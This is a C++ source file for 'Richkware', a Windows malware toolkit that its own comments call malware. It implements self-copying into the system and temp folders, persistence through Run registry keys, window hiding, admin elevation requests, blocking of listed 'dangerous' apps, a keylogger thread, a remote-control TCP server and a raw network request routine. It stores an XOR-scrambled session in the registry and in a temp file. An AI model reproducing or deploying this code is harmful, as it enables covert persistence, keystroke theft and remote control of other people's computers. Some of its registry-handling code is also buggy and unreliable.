/*
 *      Copyright 2016 Riccardo Melioli. All Rights Reserved.
 */

#include "richkware.h"

void Richkware::SaveInfo(const char* key, const char* value) {
	LoadSession(EncryptionKey);
	session.insert(std::pair<std::string, std::string>(key, value));
	SaveSession(EncryptionKey);
}

std::string Richkware::FindInfo(const char * key) {
	LoadSession(EncryptionKey);
	std::map<std::string, std::string>::iterator it = session.find(key);
	if (it != session.end())
		return it->second;
	else
		return "";
}

void Richkware::RemoveInfo(const char * key) {
	LoadSession(EncryptionKey);
	session.erase(key);
	SaveSession(EncryptionKey);
}

BOOL Richkware::IsAdmin() {
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		dwError = GetLastError();

	}
	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
		&fIsRunAsAdmin)) {
		dwError = GetLastError();

	}

	if (pAdministratorsGroup) {
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	if (ERROR_SUCCESS != dwError) {
		throw dwError;
	}

	return fIsRunAsAdmin;
}

void Richkware::RequestAdminPrivileges() {
	BOOL bAlreadyRunningAsAdministrator = FALSE;
	try {
		bAlreadyRunningAsAdministrator = IsAdmin();
	}
	catch (...) {

	}
	if (!bAlreadyRunningAsAdministrator) {
		char szPath[MAX_PATH];
		if (GetModuleFileName(NULL, szPath, MAX_PATH)) {

			SHELLEXECUTEINFO sei = { sizeof(sei) };

			sei.lpVerb = "runas";
			sei.lpFile = szPath;
			sei.hwnd = NULL;
			sei.nShow = SW_NORMAL;

			/*if (!ShellExecuteEx(&sei)) {
			 DWORD dwError = GetLastError();
			 //if (dwError == ERROR_CANCELLED)
			 //CreateThread(0, 0, (LPTHREAD_START_ROUTINE) RequestAdminPrivileges, 0, 0, 0);
			 }*/
		}

	}
	else {
		///Code
	}
}

void Richkware::Persistance() {
	// copy value in system
	HMODULE module_handler = GetModuleHandle(NULL);
	char file_path[MAX_PATH];
	char system_path[MAX_PATH];
	char system_path_reg[MAX_PATH] = "\"";
	char tmp_path[MAX_PATH];
	char tmp_path_reg[MAX_PATH] = "\"";

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	strcat(system_path_reg, system_path);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(tmp_path_reg, tmp_path);

	strcat(system_path_reg, ("\\" + AppName + ".exe\" /noshow").c_str());
	strcat(system_path, ("\\" + AppName + ".exe").c_str());
	CopyFile(file_path, system_path, true);

	strcat(tmp_path_reg, (AppName + ".exe\" /noshow").c_str());
	strcat(tmp_path, (AppName + ".exe").c_str());
	CopyFile(file_path, tmp_path, true);

	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(AppName + "1").c_str(), system_path_reg);
	SaveValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		(AppName + "2").c_str(), tmp_path_reg);

}

void Richkware::StealthWindow(const char* window) {
	HWND app_heandler = FindWindow(NULL, window);
	Sleep(1000);
	if (app_heandler != NULL)
		ShowWindow(app_heandler, false);
}

// OpenApp("notepad.exe");  "http:\\www.google.com"
void Richkware::OpenApp(const char* app) {
	ShellExecute(NULL, "open", app, NULL, NULL, SW_MAXIMIZE);
}

void Richkware::BlockApps() {
	//HANDLE hBlockAppsTh;

	hBlockAppsTh = CreateThread(0, 0, &BlockAppsThread, &dangerousApps, 0, 0);

	//WaitForSingleObject(hBlockAppsTh,INFINITE);

	//CloseHandle(hBlockAppsTh);

}

void Richkware::UnBlockApps() {
	SuspendThread(hBlockAppsTh);
}



int Richkware::StartServer(const char* port, const char* EncryptionKey) {
	WSADATA wsaData;
	int iResult;

	SOCKET ListenSocket = INVALID_SOCKET;
	SOCKET ClientSocket = INVALID_SOCKET;

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, port, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype,
		result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// multi-thread
	DWORD dwThreadIdArray[MAX_THREAD];
	HANDLE hThreadArray[MAX_THREAD];

	for (int i = 0; i < MAX_THREAD; i++) {
		// Accept a client socket
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}

		ClientSocketArgs csa;
		csa.ClientSocket = ClientSocket;
		csa.EncryptionKey = EncryptionKey;

		hThreadArray[i] = CreateThread(0, 0, &ClientSocketThread,
			(void*)&csa, 0, &dwThreadIdArray[i]);

	}
	// wait until all threads have termined
	WaitForMultipleObjects(MAX_THREAD, hThreadArray, TRUE, INFINITE);

	for (int i = 0; i < MAX_THREAD; i++) {
		CloseHandle(hThreadArray);
	}
	// cleanup
	closesocket(ClientSocket);
	WSACleanup();

	return 0;

}



const char* Richkware::RawRequest(const char* serverAddress, const char* port,
	const char* request) {
	WSADATA wsaData;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	const char* sendbuf = request;
	const int bufferlength = 512;
	char recvbuf[bufferlength];
	int iResult;
	std::string response;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		return "Error";
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(serverAddress, port, &hints, &result);
	if (iResult != 0) {
		WSACleanup();
		return "Error";
	}

	// Attempt to connect to an address until one succeeds
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			WSACleanup();
			return "Error";
		}

		// Connect to server.
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);
	if (ConnectSocket == INVALID_SOCKET) {
		WSACleanup();
		return "Error";
	}

	// Send an initial buffer
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return "Error";
	}

	// Receive until the peer closes the connection
	do {

		iResult = recv(ConnectSocket, recvbuf, bufferlength, 0);
		if (iResult > 0) {
			// answer
			response.append(recvbuf);

		}
		else if (iResult == 0) {
			// connection closed
		}
		else {
			// error
		}

	} while (iResult > 0);

	// shutdown the connection since no more data will be sent
	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		WSACleanup();
		return "Error";
	}

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return response.c_str();
}

void Richkware::Hibernation() {
	Sleep(1000);
	SendMessage(HWND_BROADCAST,
		WM_SYSCOMMAND,
		SC_MONITORPOWER, (LPARAM)2);
}


void Richkware::RandMouse() {
	// screen resolution
	RECT desktop;
	const HWND desktop_handler = GetDesktopWindow();
	GetWindowRect(desktop_handler, &desktop);
	long horizontal = desktop.right;
	long vertical = desktop.bottom;

	// move cursor
	SetCursorPos((rand() % horizontal + 1), (rand() % vertical + 1));
}

void Richkware::SaveSession(const char* EncryptionKey) {
	std::string sessionString;

	for (std::map<std::string, std::string>::iterator it = session.begin();
		it != session.end(); ++it) {
		sessionString.append(it->first + "," + it->second + "|");
	}

	sessionString = EncryptDecrypt(sessionString, EncryptionKey);

	SaveValueReg("Software\\Microsoft\\Windows", AppName.c_str(),
		sessionString.c_str());
	SaveValueToFile(sessionString.c_str());

}

void Richkware::LoadSession(const char* EncryptionKey) {
	std::string sessionString;
	sessionString = LoadValueReg("Software\\Microsoft\\Windows", AppName.c_str());
	if (sessionString.empty()) {
		sessionString = LoadValueFromFile();
	}

	sessionString = EncryptDecrypt(sessionString, EncryptionKey);

	session.clear();

	std::string key, tmp;

	for (std::string::iterator it = sessionString.begin();
		it != sessionString.end(); ++it) {

		if (*it == ',') { // end of key
			key = tmp;
			tmp = "";
		}
		else if (*it == '|') { // end of value
			// write key,value into map
			session.insert(std::pair<std::string, std::string>(key, tmp));;
			tmp = "";
		}
		else {
			tmp += *it;
		}

	}

}


void Richkware::SaveValueToFile(const char* value, const char * path) {
	std::string fileName = (AppName + ".log").c_str();
	std::string filePath;

	// save in temp folder
	if (path == NULL) {
		char tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		filePath = tmpPath + fileName;

	}
	else {
		filePath = path + fileName;
	}

	std::ofstream file(filePath.c_str());
	std::string stringValue = value;

	if (file.is_open()) {
		for (std::string::iterator it = stringValue.begin();
			it != stringValue.end(); ++it) {
			file << *it;
		}
		file.close();
	}
}

std::string Richkware::LoadValueFromFile(const char* path) {
	std::string fileName = (AppName + ".log").c_str();
	std::string filePath;

	// save in temp folder
	if (path == NULL) {
		char tmpPath[MAX_PATH];
		GetTempPath(MAX_PATH, tmpPath);
		filePath = tmpPath + fileName;

	}
	else {
		filePath = path + fileName;
	}

	std::ifstream file(filePath.c_str());
	std::string value;
	std::string tmp;

	if (file.is_open()) {
		while (!file.eof()) {
			getline(file, tmp);
			 value.push_back('\n');
			value.append(tmp);
		}
	}

	return value;

}

void Richkware::SaveValueReg(const char* path, const char* key,
	const char* value) {
	// set value in register
	HKEY hKey;
	HKEY hKey2;

	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0,
		KEY_SET_VALUE, &hKey);

	RegOpenKey(HKEY_CURRENT_USER, path, &hKey2);

	if (hKey != NULL) {
		RegSetValueEx(hKey, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}
	if (hKey2 != NULL) {
		RegSetValueEx(hKey2, key, 0, REG_SZ, (const unsigned char*)value,
			MAX_PATH);
	}

	RegCloseKey(hKey);
	RegCloseKey(hKey2);
}

std::string Richkware::LoadValueReg(const char* path, const char* key) {
	std::string value = "";
	HKEY hKey;
	
	LONG lresult = RegOpenKey(HKEY_CURRENT_USER, path, &hKey);
	if (lresult != ERROR_SUCCESS) {
		if (hKey != NULL) {
			char szBuffer[512];
			DWORD dwBufferSize = sizeof(szBuffer);
			RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
			value.append(szBuffer);
		}
	}
	else {
		lresult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hKey);
		if (lresult != ERROR_SUCCESS) {
			if (hKey != NULL) {
				char szBuffer[512];
				DWORD dwBufferSize = sizeof(szBuffer);
				RegQueryValueEx(hKey, key, 0, NULL, (LPBYTE)szBuffer, &dwBufferSize);
				value.append(szBuffer);
			}
		}
	}


	RegCloseKey(hKey);
	return value;
}

void Richkware::Keylogger(const char* fileName) {
	HANDLE hBlockAppsTh = CreateThread(0, 0, &KeyloggerThread, (void*)fileName, 0, 0);

	if (hBlockAppsTh != NULL) {
		WaitForSingleObject(hBlockAppsTh, INFINITE);
		CloseHandle(hBlockAppsTh);
	}
}


// verify the existence of malware session.
bool Richkware::CheckSession() {
	if (!(LoadValueReg("Software\\Microsoft\\Windows", AppName.c_str()).empty()))
		return true;
	return false;
}

// verify the existence of malware values created by the persistence function.
bool Richkware::CheckPersistance() {
	bool b = false;
	HMODULE module_handler = GetModuleHandle(NULL);
	char system_path[MAX_PATH];
	char file_path[MAX_PATH];
	char tmp_path[MAX_PATH];

	GetModuleFileName(module_handler, file_path, MAX_PATH);
	GetSystemDirectory(system_path, MAX_PATH);
	GetTempPath(MAX_PATH, tmp_path);
	strcat(system_path, ("\\" + AppName + ".exe").c_str());
	strcat(tmp_path, (AppName + ".exe").c_str());
	std::ifstream fileSys(system_path);
	std::ifstream fileTmp(tmp_path);

	// ((persTmpREG && persTmpFILE) || (persTmpSYS && persTmpSYS))
	if ((!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "1").c_str()).empty()) &&
		(fileSys.is_open())) ||
		(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "2").c_str()).empty()) &&
		(fileTmp.is_open()))) b = true;
/*
	if (!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "1").c_str()).empty()))
		MessageBox(NULL, "TRUERegSys", " ", 0);

//	MessageBox(NULL, (LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "1").c_str())).c_str()), " ", 0);

	if (fileSys.is_open())
		MessageBox(NULL, "TRUESYS", " ", 0);
		
	if(!(LoadValueReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", (AppName + "2").c_str()).empty()))
		MessageBox(NULL, "TRUETmpReg", " ", 0);

		
	if(fileTmp.is_open()) MessageBox(NULL, "TRUETMp", " ", 0);
*/

	fileSys.close();
	fileTmp.close();

	return b;
}

void Richkware::Initialize(const char* AppNameArg, const char* EncryptionKeyArg) {

	AppName = AppNameArg;
	system(("title " + AppName).c_str());
	StealthWindow(AppName.c_str());
	EncryptionKey = EncryptionKeyArg;
/*
	if (!(CheckSession()) && !(CheckPersistance())) {	// first run
		SaveInfo("FirstRun", "false");
		Persistance();
	}
	else if (!(CheckSession())) {	// N session, Y pers
		SaveInfo("FirstRun", "false");
		SaveInfo("RegCleaner", "true");
	}
	else if (!(CheckPersistance())) {	// Y session, N pers
		SaveInfo("TmpSysCleaner", "true");
		Persistance();
	}*/

	// metti check per ogni cosa registro o file in modo da sapere se ha qualcosa che controlla il registro o qualcosa che effettui pulizie o un antivirus


}

